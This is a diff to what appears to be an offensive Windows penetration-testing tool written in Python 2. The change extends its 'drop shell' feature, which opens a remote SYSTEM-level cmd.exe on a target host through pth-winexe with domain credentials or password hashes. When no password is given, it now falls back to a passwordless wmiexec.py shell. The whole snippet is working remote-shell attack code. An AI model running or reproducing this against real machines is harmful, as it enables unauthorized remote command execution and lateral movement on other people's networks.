@@ -2037,9 +2037,14 @@ if system_tasklist in yesanswers:
 if dropshell in yesanswers:
 	if len(targets)==1:
 		try:
-			print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
-			sys.exit()
+			if passw=="":
+				print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
+				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
+				sys.exit()
+			else:
+				print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+				sys.exit()
 				
 		except:
 			sys.exit()
